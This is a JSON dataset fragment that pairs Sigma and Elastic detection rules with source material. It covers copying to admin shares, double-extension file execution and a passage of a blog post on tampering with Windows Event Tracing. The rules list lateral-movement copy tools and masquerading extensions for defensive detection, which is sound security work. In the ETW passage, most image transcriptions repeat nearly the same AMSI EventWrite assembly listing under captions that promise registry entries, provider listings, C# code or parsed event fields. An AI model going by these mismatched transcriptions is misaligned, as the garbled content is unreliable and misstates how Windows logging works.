mistaken for threats. Educate users on proper file transfer methods and monitor for unusual patterns that deviate from documented procedures.\n\n**Response and remediation**\n- Isolate the affected system from the network to prevent further lateral movement or data exfiltration.\n- Terminate any suspicious processes identified in the alert, such as `cmd.exe`, `powershell.exe`, `xcopy.exe`, or `robocopy.exe`, that are involved in the file copy attempt.\n- Conduct a forensic analysis of the affected system to identify any additional indicators of compromise or unauthorized access.\n- Change credentials for any accounts that were used in the suspicious activity to prevent further unauthorized access.\n- Review and restrict permissions on network shares, especially hidden shares, to ensure only authorized users have access.\n- Monitor network traffic for any further suspicious activity related to hidden shares and lateral movement attempts.\n- Escalate the incident to the security operations center (SOC) or incident response team for further investigation and to determine if additional systems are compromised.\n\n## Rule query\n\n```js\nprocess where host.os.type == \"windows\" and event.type == \"start\" and\n  process.name : (\"cmd.exe\", \"powershell.exe\", \"xcopy.exe\", \"pwsh.exe\", \"powershell_ise.exe\") and\n  process.command_line : \"*\\\\\\\\*\\\\*$*\" and process.command_line : (\"*copy*\", \"*move*\", \"* cp *\", \"* mv *\")\n```\n\n**Framework**: MITRE ATT&CK™\n\n- **Tactic**:\n  - Name: Lateral Movement\n  - ID: TA0008\n  - Reference URL: https://attack.mitre.org/tactics/TA0008/\n\n- **Technique**:\n  - Name: Remote Services\n  - ID: T1021\n  - Reference URL: https://attack.mitre.org/techniques/T1021/\n\n- **Sub-technique**:\n  - Name: SMB/Windows Admin Shares\n  - ID: T1021.002\n  - Reference URL: https://attack.mitre.org/techniques/T1021/002/",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml",
    "id": "517"
  },
  {
    "url": "https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Parent Double Extension File Execution",
      "id": "5e6a80c8-2d45-4633-9ef4-fa2671a39c5c",
      "related": [
        {
          "id": "1cdd9a09-06c9-4769-99ff-626e2b3991b8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detect execution of suspicious double extension files in ParentCommandLine",
      "references": [
        "https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bluebottle-banks-targeted-africa"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-06",
      "modified": "2023-02-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ParentImage|endswith": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          },
          {
            "ParentCommandLine|contains": [
              ".doc.lnk",
              ".docx.lnk",
              ".xls.lnk",
              ".xlsx.lnk",
              ".ppt.lnk",
              ".pptx.lnk",
              ".rtf.lnk",
              ".pdf.lnk",
              ".txt.lnk",
              ".doc.js",
              ".docx.js",
              ".xls.js",
              ".xlsx.js",
              ".ppt.js",
              ".pptx.js",
              ".rtf.js",
              ".pdf.js",
              ".txt.js"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_double_extension_parent.yml",
    "id": "527"
  },
  {
    "url": "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63",
    "markdown": "# Tampering with Windows Event Tracing: Background, Offense, and Defense\n\n**Dec 24, 2018**\n\n---\n\nEvent Tracing for Windows (ETW) is the mechanism Windows uses to trace and log system events. Attackers often clear event logs to cover their tracks. Though the act of clearing an event log itself generates an event, attackers who know ETW well may take advantage of tampering opportunities to cease the flow of logging temporarily or even permanently, without generating any event log entries in the process.\n\nThe Windows event log is the data source for many of the Palantir Critical Incident Response Team’s Alerting and Detection Strategies, so familiarity with event log tampering tradecraft is foundational to our success. We continually evaluate our assumptions regarding the integrity of our event data sources, document our blind spots, and adjust our implementation. The goal of this blog post is to share our knowledge with the community by covering ETW background and basics, stealthy event log tampering techniques, and detection strategies.\n\n## Introduction to ETW and event logging\n\nThe ETW architecture differentiates between event *providers*, event *consumers*, and event *tracing sessions*. Tracing sessions are responsible for collecting events from providers and for relaying them to log files and consumers. Sessions are created and configured by *controllers* like the built-in `logman.exe` command line utility. Here are some useful commands for exploring existing trace sessions and their respective ETW providers; note that these must usually be executed from an elevated context.\n\n### List all running trace sessions\n\n```\n> logman query -ets\n```\n\n```\nData Collector Set                Type    Status\n-------------------------------------------------\nCircular Kernel Context Logger    Trace   Running\nAppModel                          Trace   Running\nScreenOnPowerStudyTraceSession    Trace   Running\nDiagLog                           Trace   Running\nEventLog-Application              Trace   Running\nEventLog-System                   Trace   Running\nLwtNetLog                         Trace   Running\nNtfsLog                           Trace   Running\nTileStore                         Trace   Running\nUBPM                              Trace   Running\nWdiContextLog                     Trace   Running\nWiFiSession                       Trace   Running\nUserNotPresentTraceSession        Trace   Running\nDiagtrack-Listener                Trace   Running\nMSDTC_TRACE_SESSION               Trace   Running\nWindowsUpdate_trace_log           Trace   Running\n```\n\n### List all providers that a trace session is subscribed to\n\n```\n> logman query \"EventLog-Application\" -ets\n```\n\n```\nName:                 EventLog-Application\nStatus:               Running\nRoot Path:            %systemdrive%\\PerfLogs\\Admin\nSegment:              Off\nSchedules:            On\nSegment Max Size:     100 MB\n\nName:                 EventLog-Application\\EventLog-Application\nType:                 Trace\nAppend:               Off\nCircular:             Off\nOverwrite:            Off\nBuffer Size:          64\nBuffers Lost:         0\nBuffers Written:      242\nBuffer Flush Timer:   1\nClock Type:           System\nFile Mode:            Real-time\n\nProvider:\nName:                 Microsoft-Windows-SenseIR\nProvider Guid:        {B6D775EF-1436-4FE6-BAD3-9E436319E218}\nLevel:                255\nKeywordsAll:          0x0\nKeywordsAny:          0x8000000000000000 (Microsoft-Windows-SenseIR/Operational)\nProperties:           65\nFilter Type:          0\n\nProvider:\nName:                 Microsoft-Windows-WDAG-Service\nProvider Guid:        {728B02D9-BF21-49F6-BE3F-91BC06F7467E}\nLevel:                255\nKeywordsAll:          0x0\nKeywordsAny:          0x8000000000000000\nProperties:           65\nFilter Type:          0\n\n...\n```\n\nThis command details the configuration of the trace session itself, followed by the configuration of each provider that the session is subscribed to, including the following parameters:\n\n- **Name**: The name of the provider. A provider only has a name if it has a registered manifest, but it always has a unique GUID.\n- **Provider GUID**: The unique GUID for the provider. The GUID and/or name of a provider is useful when performing research or operations on a specific provider.\n- **Level**: The logging level specified. Standard logging levels are: 0 — Log Always; 1 — Critical; 2 — Error; 3 — Warning; 4 — Informational; 5 — Verbose. Custom logging levels can also be defined, but levels 6–15 are reserved. More than one logging level can be captured by ORing respective levels; supplying 255 (0xFF) is the standard method of capturing all supported logging levels.\n- **KeywordsAll**: Keywords are used to filter specific categories of events. While logging level is used to filter by event verbosity/importance, keywords allow filtering by event category. A keyword corresponds to a specific bit value. *All* indicates that, for a given keyword matched by `KeywordsAny`, further filtering should be performed based on the specific bitmask in `KeywordsAll`. This field is often set to zero. More information on *All* vs. *Any* can be found here.\n- **KeywordsAny**: Enables filtering based on any combination of the keywords specified. This can be thought of as a logical OR where `KeywordsAll` is a subsequent application of a logical AND. The low 6 bytes refer to keywords specific to the provider. The high two bytes are reserved and defined in `WinMeta.xml` in the Windows SDK. For example, in event log-related trace sessions, you will see the high byte (specifically, the high nibble) set to a specific value. This corresponds to one or more event channels where the following channels are defined:\n\n```\n0x01 - Admin channel\n0x02 - Debug channel\n0x04 - Analytic channel\n0x08 - Operational channel\n```\n\n- **Properties**: This refers to optional ETW properties that can be specified when writing the event. The following values are currently supported (more information here):\n```\n0x001 - EVENT_ENABLE_PROPERTY_SID\n0x002 - EVENT_ENABLE_PROPERTY_TS_ID\n0x004 - EVENT_ENABLE_PROPERTY_STACK_TRACE\n0x008 - EVENT_ENABLE_PROPERTY_PSM_KEY\n0x010 - EVENT_ENABLE_PROPERTY_IGNORE_KEYWORD_0\n0x020 - EVENT_ENABLE_PROPERTY_PROVIDER_GROUP\n0x040 - EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0\n0x080 - EVENT_ENABLE_PROPERTY_PROCESS_START_KEY\n0x100 - EVENT_ENABLE_PROPERTY_EVENT_KEY\n0x200 - EVENT_ENABLE_PROPERTY_EXCLUDE_INPRIVATE\n```\n\nFrom a detection perspective, `EVENT_ENABLE_PROPERTY_SID`, `EVENT_ENABLE_PROPERTY_TS_ID`, `EVENT_ENABLE_PROPERTY_PROCESS_START_KEY` are valuable fields to collect. For example, `EVENT_ENABLE_PROPERTY_PROCESS_START_KEY` generates a value that uniquely identifies a process. Note that Process IDs are not unique identifiers for a process instance.\n\n- **Filter Type**: Providers can optionally choose to implement additional filtering; supported filters are defined in the provider manifest. In practice, none of the built-in providers implement filters as confirmed by running TdhEnumerateProviderFilters over all registered providers. There are some predefined filter types defined in `eventprov.h` (in the Windows SDK):\n```\n0x00000000 - EVENT_FILTER_TYPE_NONE\n0x80000000 - EVENT_FILTER_TYPE_SCHEMATIZED\n0x80000001 - EVENT_FILTER_TYPE_SYSTEM_FLAGS\n0x80000002 - EVENT_FILTER_TYPE_TRACEHANDLE\n0x80000004 - EVENT_FILTER_TYPE_PID\n0x80000008 - EVENT_FILTER_TYPE_EXECUTABLE_NAME\n0x80000010 - EVENT_FILTER_TYPE_PACKAGE_ID\n0x80000020 - EVENT_FILTER_TYPE_PACKAGE_APP_ID\n0x80000100 - EVENT_FILTER_TYPE_PAYLOAD\n0x80000200 - EVENT_FILTER_TYPE_EVENT_ID\n0x80000400 - EVENT_FILTER_TYPE_EVENT_NAME\n0x80001000 - EVENT_FILTER_TYPE_STACKWALK\n0x80002000 - EVENT_FILTER_TYPE_STACKWALK_NAME\n0x80004000 - EVENT_FILTER_TYPE_STACKWALK_LEVEL_KW\n```\n\n### Enumerating all registered ETW providers\n\nThe `logman query providers` command lists all registered ETW providers, supplying their name and GUID. An ETW provider is registered if it has a binary manifest stored in the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\{PROVIDER_GUID}` registry key. For example, the `Microsoft-Windows-PowerShell` provider has the following registry values:\n\n```image\nAlt: Provider Registry\nDescription: The image displays a screenshot of a Windows Registry entry related to an ETW (Event Tracing for Windows) provider, specifically for `Microsoft-Windows-PowerShell`. It presents several key fields: 'Name', 'Type', and 'Data', showing the default value, message file name, and resource file name associated with the PowerShell ETW provider. This information is pertinent for understanding how the ETW provider is registered and its related attributes in the registry.\nTranscription: |\n  Name                                      Type              Data\n  ------------------------------------------------------------------------------------------------\n  (Default)                                 REG_SZ           Microsoft-Windows-PowerShell\n  MessageFileName                           REG_EXPAND_SZ    %windir%\\system32\\WindowsPowerShell\\v1.0\\PSEvents.dll\n  ResourceFileNa                            REG_EXPAND_SZ    %windir%\\system32\\WindowsPowerShell\\v1.0\\PSEvents.dll\n```\n\nETW and the event log know how to properly parse and display event information to a user based on binary-serialized information in the `WEVT_TEMPLATE` resource present in the binaries listed in the `ResourceFileName` registry value. This resource is a binary representation of an instrumentation manifest (i.e., the schema for an ETW provider). The binary structure of `WEVT_TEMPLATE` is under-documented%20file%20format.asciidoc), but there are at least two tools available to assist in parsing and recovering event schema, WEPExplorer and Perfview.\n\n### Viewing an individual provider\n\nThe `logman` tool prints basic information about a provider. For example:\n\n```image\nAlt: Provider Information\nDescription: The image depicts a code snippet, likely in assembly language, showcasing a series of assembly instructions related to event data manipulation. The code includes operations for preparing and passing various parameters such as session size, event descriptor, and reserved data to a function for writing an event. This technical detail is relevant for understanding the low-level workings of Windows Event Tracing (ETW) and how event data is handled, which aligns with the context of tampering with event logging.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  mov     [ebp+EventData_session.Size], edx\n  dword   ptr [ebp+EventData_session.Reserved], ecx\n  mov     [ebp+EventData_scanStatus.Ptr+4], ecx\n  dword   ptr [ebp+EventData_scanResult], ecx\n  mov     [ebp+EventData_scanResult.Size], edx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  mov     [ebp+EventData_appname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  mov     [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentsize], ecx\n  dword   ptr [ebp+EventData_contentsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Ptr+4], ecx\n  mov     [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  dword   ptr [ebp+EventData_hash.Reserved], ecx\n  call    __imp_EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\nThe listings show supported keywords and logging values, as well as all processes that are registered to emit events via this provider. This output is useful for understanding how existing trace sessions filter on providers. It is also useful for initial discovery of potentially interesting information that could be gathered from via an ETW trace.\n\nNotably, the PowerShell provider appears to support logging to the event log based on the existence of the reserved keywords in the high nibble of the defined keywords. Not all ETW providers are designed to be ingested into the event log; rather, many ETW providers are intended to be used solely for low-level tracing, debugging, and more recently-developed security telemetry purposes. For example, Windows Defender Advanced Threat Protection relies heavily upon ETW as a supplemental detection data source.\n\n### Viewing all providers that a specific process is sending events to\n\nAnother method for discovering potentially interesting providers is to view all providers to which events are written from a specific process. For example, the following listing shows all providers relevant to `MsMpEng.exe` (the Windows Defender service, running as pid 5244 in this example):\n\n```image\nAlt: Process Providers\nDescription: The image displays a snippet of assembly code related to Windows Event Tracing. It contains various instructions involving registers and memory management, indicative of a process handling event data. Key operations include pushing parameters for an event descriptor and preparing session data for an event write call, suggesting it is part of a broader analysis of event logging in the context of Microsoft Defender. This technical detail supports the discussion on event providers and logging mechanisms.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  mov     dword [ebp+EventData_session.Size], edx\n  dword   [ebp+EventData_scanStatus.Reserved], ecx\n  dword   [ebp+EventData_scanStatusReserved], ecx\n  dword   [ebp+EventData_scanResult.Reserved], esi\n  dword   [ebp+EventData_appname.Reserved], ecx\n  dword   [ebp+EventData_appname.Ptr+4], ecx\n  dword   [ebp+EventData_contentname.Ptr+4], ecx\n  dword   [ebp+EventData_contentname.Reserved], ecx\n  dword   [ebp+EventData_contentsize.Size], edx\n  dword   [ebp+EventData_contentsize.Reserved], ecx\n  dword   [ebp+EventData_originalsize.Size], edx\n  dword   [ebp+EventData_originalsize.Reserved], ecx\n  dword   [ebp+EventData_content.Reserved], ecx\n  dword   [ebp+EventData_hash.Size], 20h\n  dword   [ebp+EventData_hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\nEntries listed with GUID are providers lacking a manifest. They will typically be related to WPP or TraceLogging, both of which are beyond the scope of this blog post. It is possible to retrieve provider names and event metadata for these provider types. For example, here are some of the resolved provider names from the unnamed providers above:\n\n- **05F95EFE-7F75–49C7-A994–60A55CC09571**\n  Microsoft.Windows.Kernel.KernelBase\n- **072665FB-8953–5A85–931D-D06AEAB3D109**\n  Microsoft.Windows.ProcessLifetimeManage\n- **7AF898D7–7E0E-518D-5F96-B1E79239484C**\n  Microsoft.Windows.Defender\n\n## Event provider internals\n\nLooking at ETW-related code snippets in built-in Windows binaries can help you understand how ETW events are constructed and how they surface in event logs. Below, we highlight two code samples, `System.Management.Automation.dll` (the core PowerShell assembly) and `amsi.dll`.\n\n### System.Management.Automation.dll event tracing\n\nOne of the great security features of PowerShell version 5 is scriptblock autologging; when enabled, script content is automatically logged to the Microsoft-Windows-PowerShell/Operational event log with event ID 4104 (warning level) if the scriptblock contains any suspicious terms. The following C# code is executed to generate the event log:\n\n```image\nAlt: PowerShell Event Logging\nDescription: The image depicts a snippet of assembly code related to event data handling in a logging process. It includes various assembly instructions that manipulate registers and push parameters onto the stack for an event write operation. The code appears to be part of a routine that prepares data for logging an event, likely related to PowerShell event tracing as discussed in the surrounding context.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n          10  ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  mov     [ebp+EventData_session.Size], edx\n  dword   ptr [ebp+EventData_scanStatus.Reserved], ecx\n  mov     [ebp+EventData_scanStatusReserved], ecx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  mov     [ebp+EventData_appname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentsize.Reserved], ecx\n  dword   ptr [ebp+EventData_contentsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Reserved], ecx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  dword   ptr [ebp+EventData_hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\nThe `LogOperationalWarning` method is implemented as follows:\n\n```image\nAlt: LogOperationalWarning Implementation\nDescription: The image displays a section of assembly code related to event logging in Windows. It contains various instructions for managing event data, including handling user data and event descriptors. The code appears to be structured with comments indicating the purpose of different lines, such as setting up the event data session and preparing parameters for the EventWrite function.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n          10  ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  push    [ebp+EventData_session.Size], ecx\n  dword   ptr [ebp+EventData_scanStatus.Reserved], ecx\n  push    [ebp+EventData_scanStatusReserved], ecx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  push    [ebp+EventData_appname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  push    [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentsize.Reserved], ecx\n  dword   ptr [ebp+EventData_contentsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Reserved], ecx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  push    [ebp+EventData_hash.Ptr+4], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  dword   ptr [ebp+EventData.Hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x)\n```\n\nThe `WriteEvent` method is implemented as follows:\n\n```image\nAlt: WriteEvent Implementation\nDescription: The image displays a section of assembly code, likely related to the implementation of event logging in the context of PowerShell's scriptblock autologging feature. The code includes various operations like pushing and moving values related to event data, specifically for the `EventWrite` function, which is used to log events in the Windows Event Log. The code highlights the manipulation of event data structures, suggesting it is part of a technical discussion on how PowerShell logs events for analysis and monitoring.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  [ebp+EventData_session.Size], ecx\n  dword   ptr [ebp+EventData_scanStatus.Reserved], ecx\n  [ebp+EventData_scanStatusReserved], ecx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Ptr+4], ecx\n  [ebp+EventData_appname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentname.Ptr+4], ecx\n  [ebp+EventData_contentname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentsize.Reserved], ecx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_originalize.Ptr+4], ecx\n  [ebp+EventData_originalize.Size], ecx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  [ebp+EventData.Hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\nFinally, the event information is marshaled and EventWriteTransfer is called, supplying the Microsoft-Windows-PowerShell provider with event data.\n\nThe relevant data supplied to `EventWriteTransfer` is as follows:\n\n- Microsoft-Windows-PowerShell provider GUID: `{A0C1853B-5C40-4b15-8766-3CF1C58F985A}`\n- Event ID: `PSEventId.ScriptBlock_Compile_Detail - 4104`\n- Channel value: `PSChannel.Operational - 16`\n  Again, the usage of a channel value indicates that the provider is intended to be used with the event log. The operational channel definition for the PowerShell ETW manifest can be seen here. When an explicit channel value is not supplied, Message Compiler (`mc.exe`) will assign a default value starting at 16. Since the operational channel was defined first, it was assigned 16.\n- Opcode value: `PSOpcode.Create - 15`\n- Logging level: `PSLevel.Warning - 3`\n- Task value: `PSTask.CommandStart - 102`\n- Keyword value: `PSKeyword.UseAlwaysAnalytic - 0x4000000000000000`\n  This value is later translated to 0 as seen in the code block above. Normally, this event would not be logged but because the Application event log trace session specifies the `EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0 Enable` flag for all of its providers which will log the event despite a keyword value not being specified.\n- Event data: the scriptblock contents and event fields\n\nUpon receiving the event from the PowerShell ETW provider, the event log service parses the binary `WEVT_TEMPLATE` schema (original XML schema) and presents human-readable, parsed event properties/fields:\n\n```image\nAlt: Parsed Event Properties\nDescription: The image depicts a code snippet written in assembly language, showing a sequence of instructions related to event data processing. It includes various operations such as loading data into registers, pushing parameters onto the stack, and calling the 'EventWrite' function. The code appears to be part of a larger implementation related to logging events in a Windows environment, specifically in the context of PowerShell event logging.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  [ebp+EventData_session.Size], ecx\n  dword   ptr [ebp+EventData_scanStatus.Reserved], ecx\n  [ebp+EventData_scanStatusReserved], ecx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  [ebp+EventData_contentsize.Size], ecx\n  dword   ptr [ebp+EventData_contentsize.Reserved], ecx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  [ebp+EventData_originalsize.Reserved], ecx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  [ebp+EventData_hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\n### amsi.dll event tracing\n\nYou may have observed that Windows 10 has an AMSI/Operational event log that is typically empty. To understand why events are not logged to this event log, you would first have to inspect how data is fed to the AMSI ETW provider (`Microsoft-Antimalware-Scan-Interface - {2A576B87-09A7-520E-C21A-4942F0271D67}`) and then observe how the Application event log trace session (`EventLog-Application`) subscribes to the AMSI ETW provider. Let’s start by looking at the provider registration in the Application event log. The following PowerShell cmdlet will supply us with this information:\n\n```\n> Get-EtwTraceProvider -SessionName EventLog-Application -Guid '{2A576B87-09A7-520E-C21A-4942F0271D67}'\n```\n\n```\nSessionName     : EventLog-Application\nGuid            : {2A576B87-09A7-520E-C21A-4942F0271D67}\nLevel           : 255\nMatchAnyKeyword : 0x8000000000000000\nMatchAllKeyword : 0x0\nEnableProperty  : {EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0, EVENT_ENABLE_PROPERTY_SID}\n```\n\nThe following properties should be noted:\n\n- Operational channel events (as indicated by `0x8000000000000000` in the MatchAnyKeyword value) are captured.\n- All logging levels are captured.\n- Events should be captured even if an event keyword value is zero as indicated by the `EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0` flag.\n\nThis information on its own does not explain why AMSI events are not logged, but it supplies needed context upon inspecting how `amsi.dll` writes events to ETW. By loading `amsi.dll` into IDA, we can see that there was a single call to the `EventWrite` function within the internal `CAmsiAntimalware::GenerateEtwEvent` function:\n\n```image\nAlt: amsi.dll EventWrite\nDescription: The image displays a code snippet in assembly language, showcasing the sequence of operations involved in calling the `EventWrite` function within the `amsi.dll` library. The code illustrates how data related to an event, likely concerning the AMSI (Antimalware Scan Interface), is structured and prepared for logging. It includes various operations such as moving values into registers, handling event data, and setting parameters for the event descriptor.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER  ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  [ebp+EventData.Session.Size], ecx\n  dword   ptr [ebp+EventData_session.Reserved], ecx\n  dword   ptr [ebp+EventData_scanStatus.Ptr+4], ecx\n  dword   ptr [ebp+EventData_scanResult], esi\n  dword   ptr [ebp+EventData_scanResult.Size], edx\n  dword   ptr [ebp+EventData_scanResult.Reserved], ecx\n  dword   ptr [ebp+EventData_appname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  dword   ptr [ebp+EventData_contentsize], ecx\n  dword   ptr [ebp+EventData_contentsize.Reserved], ecx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Ptr+4], ecx\n  dword   ptr [ebp+EventData_originalsize.Reserved], ecx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  [ebp+EventData_hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\nThe relevant portion of the call to `EventWrite` is the `EventDescriptor` argument. Upon applying the `EVENT_DESCRIPTOR` structure type to `_AMSI_SCANBUFFER`, the following information was interpreted:\n\n```image\nAlt: Event Descriptor\nDescription: The image shows a section of assembly code related to the `EventWrite` function in the `amsi.dll` file. It details the parameters being pushed onto the stack before the function call, including various data structures like `EventData_session` and `EventDescriptor`. This code snippet provides insight into the internal workings of how events are logged in the AMSI (Antimalware Scan Interface) relating to Windows Event Tracing.\nTranscription: |\n  lea     eax, [ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  dword ptr [ebx+16h] ; RegHandle\n  [ebp+EventData.Session.Size], edx\n  dword ptr [ebp+EventData_scanStatus.Reserved], ecx\n  [ebp+EventData_scanStatus.Reserved], ecx\n  dword ptr [ebp+EventData_scanResult], esi\n  dword ptr [ebp+EventData_appname.Reserved], ecx\n  dword ptr [ebp+EventData_contentname.Ptr+4], ecx\n  dword ptr [ebp+EventData_contentname.Reserved], ecx\n  dword ptr [ebp+EventData_contentsize.Reserved], 